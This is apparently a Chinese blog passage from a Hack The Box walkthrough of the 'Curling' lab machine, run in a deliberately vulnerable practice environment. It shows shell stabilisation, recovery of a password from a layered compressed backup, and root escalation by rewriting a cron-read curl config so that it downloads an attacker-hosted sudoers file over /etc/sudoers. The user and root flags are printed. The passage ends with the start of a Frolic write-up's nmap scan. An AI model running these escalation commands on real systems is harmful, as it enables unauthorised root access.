whoami&amp;&amp;id whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) 成功拿到一个 shell 接着修复一下shell python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; Ctrl+Z stty raw -echo; fg export TERM=xterm stty rows 51 cols 237 权限提升Userwww-data@curling:/home$ ls floris www-data@curling:/home$ cd floris www-data@curling:/home/floris$ ls admin-area password_backup user.txt 在 &#x2F;home&#x2F;floris 中发现了一个目录 admin-area 一个文件 password_backup 其中目录我们没权限访问，但文件我们有权限访问 www-data@curling:/home/floris$ cat password_backup 00000000: 425a 6839 3141 5926 5359 819b bb48 0000 BZh91AY&amp;SY...H.. 00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34 ....A...P)ava.:4 00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960 N...n.T.#.@%...` 00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000 ......z.@...... 00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800 ..i.4hdi...9.h.. 00000050: 000f 51a0 0064 681a 069e a190 0000 0034 ..Q..dh........4 00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0 i...5.n......J.. 00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78 .h...*..}y..&lt;~.x 00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931 .&gt;...sVT.zH....1 00000090: c856 921b 1221 3385 6046 a2dd c173 0d22 .V...!3.`F...s.&quot; 000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290 ..n....7j:X.d.R. 000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503 .k./... ....)p.. 000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843 7..;.....9...P.C 000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c .Y.P...HB....*.. 000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090 .G.. .U@r..rE8P. 000000f0: 819b bb48 ...H 查看后发现是乱码，使用 xxd 查看并保存到文件 www-data@curling:/home/floris$ xxd -r password_backup &gt; /tmp/backup www-data@curling:/home/floris$ cd /tmp www-data@curling:/tmp$ file backup backup: bzip2 compressed data, block size = 900k 查看文件类型发现是一个 bzip2 的类型 www-data@curling:/tmp$ mv backup backup.bz2 www-data@curling:/tmp$ bzip2 -d backup.bz2 www-data@curling:/tmp$ ls backup 咱们把这个文件解压出来，然后再去看看 www-data@curling:/tmp$ ls backup www-data@curling:/tmp$ file backup backup: gzip compressed data, was &quot;password&quot;, last modified: Tue May 22 19:16:20 2018, from Unix 解压出来后发现是个 gzip 文件，还得解压一次 www-data@curling:/tmp$ mv backup backup.gz www-data@curling:/tmp$ tar xvf backup.gz www-data@curling:/tmp$ ls backup.out www-data@curling:/tmp$ file backup.out backup.out: POSIX tar archive (GNU) 反正这里得解压好几次，给我弄的有点晕，还以为是在无限循环呢 www-data@curling:/tmp$ mv backup.out backup.tar www-data@curling:/tmp$ tar xvf backup.tar password.txt 总算解压完了，查看一下文件 www-data@curling:/tmp$ cat password.txt 5d&lt;wdCbdZu)|hChXll 感觉这是用户 floris 的密码了，去登录 ssh 试试 ┌──(root💀kali)-[~/Desktop] └─# ssh floris@10.10.10.150 The authenticity of host &#39;10.10.10.150 (10.10.10.150)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:o1Cqn+GlxiPRiKhany4ZMStLp3t9ePE9GjscsUsEjWM. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.10.150&#39; (ECDSA) to the list of known hosts. floris@10.10.10.150&#39;s password: Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-156-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu Apr 28 06:53:07 UTC 2022 System load: 0.0 Processes: 172 Usage of /: 49.2% of 9.78GB Users logged in: 0 Memory usage: 25% IP address for ens33: 10.10.10.150 Swap usage: 0% 0 updates can be applied immediately. Last login: Wed Sep 8 11:42:07 2021 from 10.10.14.15 floris@curling:~$ whoami&amp;&amp;id floris uid=1000(floris) gid=1004(floris) groups=1004(floris) 成功提权到 user 权限用户 floris@curling:~$ cat user.txt 65dd1df0713b40d88ead98cf11b8530b 成功拿到一个 user 权限的 flag 文件 Rootfloris@curling:~$ sudo -l [sudo] password for floris: Sorry, user floris may not run sudo on curling. sudo -l 没有东西，咱们还是着眼于 admin-area 目录吧 floris@curling:~/admin-area$ ls -la total 28 drwxr-x--- 2 root floris 4096 May 22 2018 . drwxr-xr-x 6 floris floris 4096 May 22 2018 .. -rw-rw---- 1 root floris 25 Apr 28 06:55 input -rw-rw---- 1 root floris 14236 Apr 28 06:55 report 这边是有两个文件，并且咱们有查看和写入权限 floris@curling:~/admin-area$ cat input url = &quot;http://127.0.0.1&quot; floris@curling:~/admin-area$ cat report &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en-gb&quot; dir=&quot;ltr&quot;&gt; &lt;head&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;base href=&quot;http://127.0.0.1/&quot; /&gt; &lt;meta name=&quot;description&quot; content=&quot;best curling site on the planet!&quot; /&gt; &lt;meta name=&quot;generator&quot; content=&quot;Joomla! - Open Source Content Management&quot; /&gt; &lt;title&gt;Home&lt;/title&gt; &lt;link href=&quot;/index.php?format=feed&amp;type=rss&quot; rel=&quot;alternate&quot; type=&quot;application/rss+xml&quot; title=&quot;RSS 2.0&quot; /&gt; &lt;link href=&quot;/index.php?format=feed&amp;type=atom&quot; rel=&quot;alternate&quot; type=&quot;application/atom+xml&quot; title=&quot;Atom 1.0&quot; /&gt; &lt;link href=&quot;/templates/protostar/favicon.ico&quot; rel=&quot;shortcut icon&quot; type=&quot;image/vnd.microsoft.icon&quot; /&gt; &lt;link href=&quot;/templates/protostar/css/template.css?b6bf078482bc6a711b54fa9e74e19603&quot; rel=&quot;stylesheet&quot; /&gt; &lt;link href=&quot;https://fonts.googleapis.com/css?family=Open+Sans&quot; rel=&quot;stylesheet&quot; /&gt; &lt;style&gt; h1, h2, h3, h4, h5, h6, .site-title { font-family: &#39;Open Sans&#39;, sans-serif; } &lt;/style&gt; &lt;script type=&quot;application/json&quot; class=&quot;joomla-script-options new&quot;&gt;{&quot;csrf.token&quot;:&quot;e6b8a82d84a03e7e05d6452f52f975f7&quot;,&quot;system.paths&quot;:{&quot;root&quot;:&quot;&quot;,&quot;base&quot;:&quot;&quot;},&quot;system.keepalive&quot;:{&quot;interval&quot;:840000,&quot;uri&quot;:&quot;\\/index.php\\/component\\/ajax\\/?format=json&quot;}}&lt;/script&gt; &lt;script src=&quot;/media/jui/js/jquery.min.js?b6bf078482bc6a711b54fa9e74e19603&quot;&gt;&lt;/script&gt; &lt;script src=&quot;/media/jui/js/jquery-noconflict.js?b6bf078482bc6a711b54fa9e74e19603&quot;&gt;&lt;/script&gt; &lt;script src=&quot;/media/jui/js/jquery-migrate.min.js?b6bf078482bc6a711b54fa9e74e19603&quot;&gt;&lt;/script&gt; &lt;script src=&quot;/media/system/js/caption.js?b6bf078482bc6a711b54fa9e74e19603&quot;&gt;&lt;/script&gt; &lt;script src=&quot;/media/jui/js/bootstrap.min.js?b6bf078482bc6a711b54fa9e74e19603&quot;&gt;&lt;/script&gt; &lt;script src=&quot;/templates/protostar/js/template.js?b6bf078482bc6a711b54fa9e74e19603&quot;&gt;&lt;/script&gt; &lt;!--[if lt IE 9]&gt;&lt;script src=&quot;/media/jui/js/html5.js?b6bf078482bc6a711b54fa9e74e19603&quot;&gt;&lt;/script&gt;&lt;![endif]--&gt; &lt;script src=&quot;/media/system/js/core.js?b6bf078482bc6a711b54fa9e74e19603&quot;&gt;&lt;/script&gt; &lt;!--[if lt IE 9]&gt;&lt;script src=&quot;/media/system/js/polyfill.event.js?b6bf078482bc6a711b54fa9e74e19603&quot;&gt;&lt;/script&gt;&lt;![endif]--&gt; &lt;script src=&quot;/media/system/js/keepalive.js?b6bf078482bc6a711b54fa9e74e19603&quot;&gt;&lt;/script&gt; &lt;script&gt; jQuery(window).on(&#39;load&#39;, function() { new JCaption(&#39;img.caption&#39;); jQuery(function($){ initTooltips(); $(&quot;body&quot;).on(&quot;subform-row-add&quot;, initTooltips); function initTooltips (event, container) { container = container || document;$(container).find(&quot;.hasTooltip&quot;).tooltip({&quot;html&quot;: true,&quot;container&quot;: &quot;body&quot;});} }); &lt;/script&gt; &lt;/head&gt; &lt;body class=&quot;site com_content view-featured no-layout no-task itemid-101&quot;&gt; &lt;!-- Body --&gt; &lt;div class=&quot;body&quot; id=&quot;top&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;!-- Header --&gt; &lt;header class=&quot;header&quot; role=&quot;banner&quot;&gt; &lt;div class=&quot;header-inner clearfix&quot;&gt; &lt;a class=&quot;brand pull-left&quot; href=&quot;/&quot;&gt; &lt;span class=&quot;site-title&quot; title=&quot;Cewl Curling site!&quot;&gt;Cewl Curling site!&lt;/span&gt; &lt;/a&gt; &lt;div class=&quot;header-search pull-right&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;/header&gt; &lt;div class=&quot;row-fluid&quot;&gt; &lt;main id=&quot;content&quot; role=&quot;main&quot; class=&quot;span9&quot;&gt; &lt;!-- Begin Content --&gt; &lt;div id=&quot;system-message-container&quot;&gt; &lt;/div&gt; &lt;div class=&quot;blog-featured&quot; itemscope itemtype=&quot;https://schema.org/Blog&quot;&gt; &lt;div class=&quot;page-header&quot;&gt; &lt;h1&gt; Home &lt;/h1&gt; &lt;/div&gt; &lt;div class=&quot;items-leading clearfix&quot;&gt; &lt;div class=&quot;leading-0 clearfix&quot; itemprop=&quot;blogPost&quot; itemscope itemtype=&quot;https://schema.org/BlogPosting&quot;&gt; &lt;h2 class=&quot;item-title&quot; itemprop=&quot;headline&quot;&gt; &lt;a href=&quot;/index.php/2-uncategorised/3-what-s-the-object-of-curling&quot; itemprop=&quot;url&quot;&gt; What&#39;s the object of curling? &lt;/a&gt; &lt;/h2&gt; &lt;div class=&quot;icons&quot;&gt; &lt;div class=&quot;btn-group pull-right&quot;&gt; &lt;button class=&quot;btn dropdown-toggle&quot; type=&quot;button&quot; id=&quot;dropdownMenuButton-3&quot; aria-label=&quot;User tools&quot; data-toggle=&quot;dropdown&quot; aria-haspopup=&quot;true&quot; aria-expanded=&quot;false&quot;&gt; &lt;span class=&quot;icon-cog&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;span class=&quot;caret&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;/button&gt; &lt;ul class=&quot;dropdown-menu&quot; aria-labelledby=&quot;dropdownMenuButton-3&quot;&gt; &lt;li class=&quot;print-icon&quot;&gt; &lt;a href=&quot;/index.php/2-uncategorised/3-what-s-the-object-of-curling?tmpl=component&amp;print=1&quot; title=&quot;Print article &lt; What&#39;s the object of curling? &gt;&quot; onclick=&quot;window.open(this.href,&#39;win2&#39;,&#39;status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no&#39;); return false;&quot; rel=&quot;nofollow&quot;&gt; &lt;span class=&quot;icon-print&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; Print &lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;dl class=&quot;article-info muted&quot;&gt; &lt;dt class=&quot;article-info-term&quot;&gt; Details &lt;/dt&gt; &lt;dd class=&quot;createdby&quot; itemprop=&quot;author&quot; itemscope itemtype=&quot;https://schema.org/Person&quot;&gt; Written by &lt;span itemprop=&quot;name&quot;&gt;Super User&lt;/span&gt; &lt;/dd&gt; &lt;dd class=&quot;category-name&quot;&gt; Category: &lt;a href=&quot;/index.php/2-uncategorised&quot; itemprop=&quot;genre&quot;&gt;Uncategorised&lt;/a&gt; &lt;/dd&gt; &lt;dd class=&quot;published&quot;&gt; &lt;span class=&quot;icon-calendar&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;time datetime=&quot;2018-05-22T18:54:21+00:00&quot; itemprop=&quot;datePublished&quot;&gt; Published: 22 May 2018 &lt;/time&gt; &lt;/dd&gt; &lt;dd class=&quot;hits&quot;&gt; &lt;span class=&quot;icon-eye-open&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;meta itemprop=&quot;interactionCount&quot; content=&quot;UserPageVisits:5&quot; /&gt; Hits: 5 &lt;/dd&gt; &lt;/dl&gt; &lt;p&gt;Good question. First, let&#39;s get a bit of the jargon down. The playing surface in curling is called &quot;the sheet.&quot; Sheet dimensions can vary, but they&#39;re usually around 150 feet long by about 15 feet wide. The sheet is covered with tiny droplets of water that become ice and cause the stones to &quot;curl,&quot; or deviate from a straight path. These water droplets are known as &quot;pebble.&quot;&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;items-row cols-3 row-0 row-fluid&quot;&gt; &lt;div class=&quot;item column-1 span4&quot; itemprop=&quot;blogPost&quot; itemscope itemtype=&quot;https://schema.org/BlogPosting&quot;&gt; &lt;h2 class=&quot;item-title&quot; itemprop=&quot;headline&quot;&gt; &lt;a href=&quot;/index.php/2-uncategorised/2-curling-you-know-its-true&quot; itemprop=&quot;url&quot;&gt; Curling you know its true! &lt;/a&gt; &lt;/h2&gt; &lt;div class=&quot;icons&quot;&gt; &lt;div class=&quot;btn-group pull-right&quot;&gt; &lt;button class=&quot;btn dropdown-toggle&quot; type=&quot;button&quot; id=&quot;dropdownMenuButton-2&quot; aria-label=&quot;User tools&quot; data-toggle=&quot;dropdown&quot; aria-haspopup=&quot;true&quot; aria-expanded=&quot;false&quot;&gt; &lt;span class=&quot;icon-cog&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;span class=&quot;caret&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;/button&gt; &lt;ul class=&quot;dropdown-menu&quot; aria-labelledby=&quot;dropdownMenuButton-2&quot;&gt; &lt;li class=&quot;print-icon&quot;&gt; &lt;a href=&quot;/index.php/2-uncategorised/2-curling-you-know-its-true?tmpl=component&amp;print=1&quot; title=&quot;Print article &lt; Curling you know its true! &gt;&quot; onclick=&quot;window.open(this.href,&#39;win2&#39;,&#39;status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no&#39;); return false;&quot; rel=&quot;nofollow&quot;&gt; &lt;span class=&quot;icon-print&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; Print &lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;dl class=&quot;article-info muted&quot;&gt; &lt;dt class=&quot;article-info-term&quot;&gt; Details &lt;/dt&gt; &lt;dd class=&quot;createdby&quot; itemprop=&quot;author&quot; itemscope itemtype=&quot;https://schema.org/Person&quot;&gt; Written by &lt;span itemprop=&quot;name&quot;&gt;Super User&lt;/span&gt; &lt;/dd&gt; &lt;dd class=&quot;category-name&quot;&gt; Category: &lt;a href=&quot;/index.php/2-uncategorised&quot; itemprop=&quot;genre&quot;&gt;Uncategorised&lt;/a&gt; &lt;/dd&gt; &lt;dd class=&quot;published&quot;&gt; &lt;span class=&quot;icon-calendar&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;time datetime=&quot;2018-05-22T18:53:17+00:00&quot; itemprop=&quot;datePublished&quot;&gt; Published: 22 May 2018 &lt;/time&gt; &lt;/dd&gt; &lt;dd class=&quot;hits&quot;&gt; &lt;span class=&quot;icon-eye-open&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;meta itemprop=&quot;interactionCount&quot; content=&quot;UserPageVisits:4&quot; /&gt; Hits: 4 &lt;/dd&gt; &lt;/dl&gt; &lt;p&gt;Curling is absolutely the best sport to watch on television, particularly for viewers looking for an escape from the frantic &quot;more, faster, bigger, higher&quot; grind of most televised games. Watching basketball or hockey can get you so hyped up, you feel like drinking a Red Bull and doing jumping jacks. Watching curling makes you want to drink a glass of red wine and lie down on the shag carpet. Curling is deliberate. Thoughtful, even. The games move very slowly. The players spend a lot of time talking strategy. There are nods and quiet words of encouragement; rarely are there disagreements. When it comes time for a team member to play their turn by sliding a stone down the ice, the moves are elegant. There&#39;s a wind up, a push-off, a slide, and a gentle release. Such poise and finesse!&lt;/p&gt; &lt;/div&gt; &lt;div class=&quot;item column-2 span4&quot; itemprop=&quot;blogPost&quot; itemscope itemtype=&quot;https://schema.org/BlogPosting&quot;&gt; &lt;h2 class=&quot;item-title&quot; itemprop=&quot;headline&quot;&gt; &lt;a href=&quot;/index.php/2-uncategorised/1-first-post-of-curling2018&quot; itemprop=&quot;url&quot;&gt; My first post of curling in 2018! &lt;/a&gt; &lt;/h2&gt; &lt;div class=&quot;icons&quot;&gt; &lt;div class=&quot;btn-group pull-right&quot;&gt; &lt;button class=&quot;btn dropdown-toggle&quot; type=&quot;button&quot; id=&quot;dropdownMenuButton-1&quot; aria-label=&quot;User tools&quot; data-toggle=&quot;dropdown&quot; aria-haspopup=&quot;true&quot; aria-expanded=&quot;false&quot;&gt; &lt;span class=&quot;icon-cog&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;span class=&quot;caret&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;/button&gt; &lt;ul class=&quot;dropdown-menu&quot; aria-labelledby=&quot;dropdownMenuButton-1&quot;&gt; &lt;li class=&quot;print-icon&quot;&gt; &lt;a href=&quot;/index.php/2-uncategorised/1-first-post-of-curling2018?tmpl=component&amp;print=1&quot; title=&quot;Print article &lt; My first post of curling in 2018! &gt;&quot; onclick=&quot;window.open(this.href,&#39;win2&#39;,&#39;status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no&#39;); return false;&quot; rel=&quot;nofollow&quot;&gt; &lt;span class=&quot;icon-print&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; Print &lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;dl class=&quot;article-info muted&quot;&gt; &lt;dt class=&quot;article-info-term&quot;&gt; Details &lt;/dt&gt; &lt;dd class=&quot;createdby&quot; itemprop=&quot;author&quot; itemscope itemtype=&quot;https://schema.org/Person&quot;&gt; Written by &lt;span itemprop=&quot;name&quot;&gt;Super User&lt;/span&gt; &lt;/dd&gt; &lt;dd class=&quot;category-name&quot;&gt; Category: &lt;a href=&quot;/index.php/2-uncategorised&quot; itemprop=&quot;genre&quot;&gt;Uncategorised&lt;/a&gt; &lt;/dd&gt; &lt;dd class=&quot;published&quot;&gt; &lt;span class=&quot;icon-calendar&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;time datetime=&quot;2018-05-22T18:51:53+00:00&quot; itemprop=&quot;datePublished&quot;&gt; Published: 22 May 2018 &lt;/time&gt; &lt;/dd&gt; &lt;dd class=&quot;hits&quot;&gt; &lt;span class=&quot;icon-eye-open&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;meta itemprop=&quot;interactionCount&quot; content=&quot;UserPageVisits:4&quot; /&gt; Hits: 4 &lt;/dd&gt; &lt;/dl&gt; &lt;p&gt;Hey this is the first post on this amazing website! Stay tuned for more amazing content! curling2018 for the win!&lt;/p&gt; &lt;p&gt;- Floris&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;clearfix&quot;&gt;&lt;/div&gt; &lt;ul itemscope itemtype=&quot;https://schema.org/BreadcrumbList&quot; class=&quot;breadcrumb&quot;&gt; &lt;li&gt; You are here: &lt;/li&gt; &lt;li itemprop=&quot;itemListElement&quot; itemscope itemtype=&quot;https://schema.org/ListItem&quot; class=&quot;active&quot;&gt; &lt;span itemprop=&quot;name&quot;&gt; Home &lt;/span&gt; &lt;meta itemprop=&quot;position&quot; content=&quot;1&quot;&gt; &lt;/li&gt; &lt;/ul&gt; &lt;!-- End Content --&gt; &lt;/main&gt; &lt;div id=&quot;aside&quot; class=&quot;span3&quot;&gt; &lt;!-- Begin Right Sidebar --&gt; &lt;div class=&quot;well _menu&quot;&gt;&lt;h3 class=&quot;page-header&quot;&gt;Main Menu&lt;/h3&gt;&lt;ul class=&quot;nav menu&quot;&gt; &lt;li class=&quot;item-101 default current active&quot;&gt;&lt;a href=&quot;/index.php&quot; &gt;Home&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt; &lt;/div&gt;&lt;div class=&quot;well &quot;&gt;&lt;h3 class=&quot;page-header&quot;&gt;Login Form&lt;/h3&gt;&lt;form action=&quot;/index.php&quot; method=&quot;post&quot; id=&quot;login-form&quot; class=&quot;form-inline&quot;&gt; &lt;div class=&quot;userdata&quot;&gt; &lt;div id=&quot;form-login-username&quot; class=&quot;control-group&quot;&gt; &lt;div class=&quot;controls&quot;&gt; &lt;div class=&quot;input-prepend&quot;&gt; &lt;span class=&quot;add-on&quot;&gt; &lt;span class=&quot;icon-user hasTooltip&quot; title=&quot;Username&quot;&gt;&lt;/span&gt; &lt;label for=&quot;modlgn-username&quot; class=&quot;element-invisible&quot;&gt;Username&lt;/label&gt; &lt;/span&gt; &lt;input id=&quot;modlgn-username&quot; type=&quot;text&quot; name=&quot;username&quot; class=&quot;input-small&quot; tabindex=&quot;0&quot; size=&quot;18&quot; placeholder=&quot;Username&quot; /&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;form-login-password&quot; class=&quot;control-group&quot;&gt; &lt;div class=&quot;controls&quot;&gt; &lt;div class=&quot;input-prepend&quot;&gt; &lt;span class=&quot;add-on&quot;&gt; &lt;span class=&quot;icon-lock hasTooltip&quot; title=&quot;Password&quot;&gt; &lt;/span&gt; &lt;label for=&quot;modlgn-passwd&quot; class=&quot;element-invisible&quot;&gt;Password &lt;/label&gt; &lt;/span&gt; &lt;input id=&quot;modlgn-passwd&quot; type=&quot;password&quot; name=&quot;password&quot; class=&quot;input-small&quot; tabindex=&quot;0&quot; size=&quot;18&quot; placeholder=&quot;Password&quot; /&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;form-login-remember&quot; class=&quot;control-group checkbox&quot;&gt; &lt;label for=&quot;modlgn-remember&quot; class=&quot;control-label&quot;&gt;Remember Me&lt;/label&gt; &lt;input id=&quot;modlgn-remember&quot; type=&quot;checkbox&quot; name=&quot;remember&quot; class=&quot;inputbox&quot; value=&quot;yes&quot;/&gt; &lt;/div&gt; &lt;div id=&quot;form-login-submit&quot; class=&quot;control-group&quot;&gt; &lt;div class=&quot;controls&quot;&gt; &lt;button type=&quot;submit&quot; tabindex=&quot;0&quot; name=&quot;Submit&quot; class=&quot;btn btn-primary login-button&quot;&gt;Log in&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;ul class=&quot;unstyled&quot;&gt; &lt;li&gt; &lt;a href=&quot;/index.php/component/users/?view=remind&amp;Itemid=101&quot;&gt; Forgot your username?&lt;/a&gt; &lt;/li&gt; &lt;li&gt; &lt;a href=&quot;/index.php/component/users/?view=reset&amp;Itemid=101&quot;&gt; Forgot your password?&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;input type=&quot;hidden&quot; name=&quot;option&quot; value=&quot;com_users&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;task&quot; value=&quot;user.login&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;return&quot; value=&quot;aHR0cDovLzEyNy4wLjAuMS8=&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;e6b8a82d84a03e7e05d6452f52f975f7&quot; value=&quot;1&quot; /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;!-- End Right Sidebar --&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- Footer --&gt; &lt;footer class=&quot;footer&quot; role=&quot;contentinfo&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;hr /&gt; &lt;p class=&quot;pull-right&quot;&gt; &lt;a href=&quot;#top&quot; id=&quot;back-top&quot;&gt; Back to Top &lt;/a&gt; &lt;/p&gt; &lt;p&gt; © 2022 Cewl Curling site! &lt;/p&gt; &lt;/div&gt; &lt;/footer&gt; &lt;/body&gt; &lt;!-- secret.txt --&gt; &lt;/html&gt; 有点没明白这是什么意思，但是 input 提示本地 URL 地址，我们还是去请求一下试试吧 curl http://127.0.0.1 然后返回的是 report 的内容，也是首页的内容 floris@curling:~/admin-area$ ls -la total 28 drwxr-x--- 2 root floris 4096 May 22 2018 . drwxr-xr-x 6 floris floris 4096 May 22 2018 .. -rw-rw---- 1 root floris 25 Apr 28 06:55 input -rw-rw---- 1 root floris 14236 Apr 28 06:55 report floris@curling:~/admin-area$ ls -la total 28 drwxr-x--- 2 root floris 4096 May 22 2018 . drwxr-xr-x 6 floris floris 4096 May 22 2018 .. -rw-rw---- 1 root floris 25 Apr 28 07:02 input -rw-rw---- 1 root floris 14236 Apr 28 07:02 report 对比一下，发现这两个文件一直在被刷新或者说写入内容 运行一下 pspy64 看看 2022/04/28 07:16:01 CMD: UID=0 PID=16262 | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 2022/04/28 07:16:01 CMD: UID=0 PID=16261 | /bin/sh -c sleep 1; cat /root/default.txt &gt; /home/floris/admin-area/input 2022/04/28 07:16:01 CMD: UID=0 PID=16260 | /usr/sbin/CRON -f 2022/04/28 07:16:01 CMD: UID=0 PID=16259 | /usr/sbin/CRON -f 2022/04/28 07:16:01 CMD: UID=0 PID=16264 | curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 2022/04/28 07:16:13 CMD: UID=0 PID=16266 | 2022/04/28 07:17:01 CMD: UID=0 PID=16274 | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 2022/04/28 07:17:01 CMD: UID=0 PID=16272 | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 我们可以看到，这个 curl 每隔几秒就会运行一下，那咱们是可以在 &#x2F;home&#x2F;floris&#x2F;admin-area&#x2F;input 中写入恶意内容，以 Getshell 在本地构造一个恶意 exploit 文件 ┌──(root💀kali)-[/opt/tools] └─# cat exploit root ALL=(ALL:ALL) ALL floris ALL=(ALL:ALL) ALL 然后使用 python3 开启一个 HTTP 服务器 python3 -m http.server 80 接着在靶机中执行下面的命令 echo -e &#39;url = &quot;http://10.10.16.12/exploit&quot;\\noutput = &quot;/etc/sudoers&quot;&#39; &gt; input 然后等着就行 ┌──(root💀kali)-[/opt/tools] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.150 - - [28/Apr/2022 03:23:03] &quot;GET /exploit HTTP/1.1&quot; 200 - 等我们这边的 HTTP 服务出现请求以后，就是修改成功了 接着使用 sudo su 切换到 root 用户，密码还是 floris 用户的密码 floris@curling:~/admin-area$ sudo su [sudo] password for floris: root@curling:/home/floris/admin-area# whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) 成功提权到 root 权限 root@curling:/home/floris/admin-area# cat /root/root.txt 82c198ab6fc5365fdc6da2ee5c26064a 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Frolic - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Frolic","date":"2022-04-27T11:38:36.000Z","updated":"2023-06-13T03:44:25.000Z","comments":true,"path":"2022/04/27/Hackthebox/Easy/Hackthebox-Frolic/","link":"","permalink":"http://www.lucifiel.com/2022/04/27/Hackthebox/Easy/Hackthebox-Frolic/","excerpt":"","text":"Hackthebox - Frolic靶场信息 靶场类型 信息收集Nmap┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.111 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-25 21:22 EDT Nmap scan report for 10.10.10.111 Host is up (0.32s latency). Not shown: 65530 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA) | 256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA) |_ 256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 1880/tcp open http Node.js (Express middleware) |_http-title: Node-RED 9999/tcp open http nginx 1.10.3 (Ubuntu) |_http-server-header: nginx/1.10.3 (Ubuntu) |_http-title: Welcome to nginx! No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=4/25%OT=22%CT=1%CU=38693%PV=Y%DS=2%DC=T%G=Y%TM=626749B OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)SEQ OS:(SP=105%GCD=1%ISR=10B%TI=Z%II=I%TS=8)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O 